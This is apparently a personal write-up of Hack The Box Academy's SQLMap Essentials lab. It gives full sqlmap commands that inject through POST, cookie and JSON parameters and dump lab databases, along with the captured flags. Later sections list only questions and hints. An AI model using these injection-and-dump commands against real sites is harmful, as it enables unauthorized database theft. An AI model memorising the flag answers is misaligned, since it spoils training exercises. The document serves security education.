# SQLMap Essentials
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: SQLMap Essentials
* Tier: II
* Difficulty: Easy 
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)


---
## SQLMap Overview
### Question:
![](./attachments/Pasted%20image%2020220703120903.png)

![](./attachments/Pasted%20image%2020220703120958.png)

**Answer:** `UNION query-based`

---
## Running SQLMap on an HTTP Request
### Question 1:
![](./attachments/Pasted%20image%2020220703114906.png)

*Hint: Use options "--batch --dump" to automatically dump all data.*

![](./attachments/Pasted%20image%2020220703124752.png)

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case2.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://157.245.33.77:32596' -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/case2.php' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1' --batch --dump
        ___
       __H__                                                                                                                                                                              
 ___ ___["]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:45:25 /2022-07-03/

[06:45:25] [INFO] resuming back-end DBMS 'mysql' 
[06:45:25] [INFO] testing connection to the target URL
(...)
[06:46:22] [INFO] fetching entries for table 'flag2' in database 'testdb'
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[06:46:23] [INFO] table 'testdb.flag2' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag2.csv'
[06:46:23] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 06:46:23 /2022-07-03/
```

**Answer:** `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

### Question 2:
![](./attachments/Pasted%20image%2020220703114935.png)

*Hint: Try to see where the 'id=1' is sent, and specify this location as the injection mark.*

Insert `*` into cookie value, `'Cookie: id=1*'`.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case3.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --batch --dump         
        ___
       __H__                                                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:55:23 /2022-07-03/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[06:55:23] [INFO] testing connection to the target URL
(...)
[06:56:42] [INFO] fetching entries for table 'flag3' in database 'testdb'
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

[06:56:42] [INFO] table 'testdb.flag3' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag3.csv'
[06:56:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 06:56:42 /2022-07-03/
```

**Answer:** `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

### Question 3:
![](./attachments/Pasted%20image%2020220703114945.png)

*Hint: When dealing with complex HTTP requests, it's best to use sqlmap with the '-r' option.*

Get the URL 

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case4.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'Origin: http://157.245.33.77:32596' -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/case4.php' --data-raw '{"id":1}' --batch --dump
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:05:13 /2022-07-03/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:05:13] [INFO] testing connection to the target URL
(...)
[07:06:36] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

[07:06:36] [INFO] table 'testdb.flag4' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag4.csv'
[07:06:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 07:06:36 /2022-07-03/
```

**Answer:** `HTB{j450n_v00rh335_53nd5_6r475}`

---
## Attack Tuning
### Question 1:
![](./attachments/Pasted%20image%2020220703115136.png)

*Hint: You can use the option '-T flag5' to only dump data from the needed table. You can use the '--no-cast' flag to ensure you get the correct content. You may also, try running the command a few times to ensure you captured the content correctly.*

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020220703115151.png)

*Hint: Use the prefix '`)'.*

**Answer:** ``

### Question 3:
![](./attachments/Pasted%20image%2020220703115233.png)

*Hint: Try to count the number of columns in the page output, and specify them for sqlmap.*

**Answer:** ``

---
## Database Enumeration
### Question:
![](./attachments/Pasted%20image%2020220703115436.png)

*Hint: To be more efficient, try to specify the database and table name for sqlmap.*

**Answer:** ``

---
## Advanced Database Enumeration
### Question 1:
![](./attachments/Pasted%20image%2020220703115543.png)

*Hint: Try to search for the column!*

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020220703115552.png)

**Answer:** ``

---
## Bypassing Web Application Protections
### Question 1:
![](./attachments/Pasted%20image%2020220703115739.png)

*Hint: Don't forget to specify the token name.*

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020220703115749.png)

*Hint: Don't forget to specify the parameter name you need to randomize.*

**Answer:** ``

### Question 3:
![](./attachments/Pasted%20image%2020220703115759.png)

*Hint: Try to see why the page is preventing sqlmap from sending HTTP request to it, and then bypass it.*

**Answer:** ``

### Question 4:
![](./attachments/Pasted%20image%2020220703115808.png)

*Hint: Based on the data provided in the page, pick the appropriate tamper script to bypass the page's protections.*

**Answer:** ``

---
## OS Exploitation
### Question:
![](./attachments/Pasted%20image%2020220703120016.png)

**Answer:** ``
 
### Question:
![](./attachments/Pasted%20image%2020220703120028.png)

*Hint: The flag is in a very common directory!*

**Answer:** ``

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220703120124.png)

*Hint: First, navigate the website to find potential attack vectors. Then, try to use various security bypassing techniques you learned to get SQL injection working.*

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]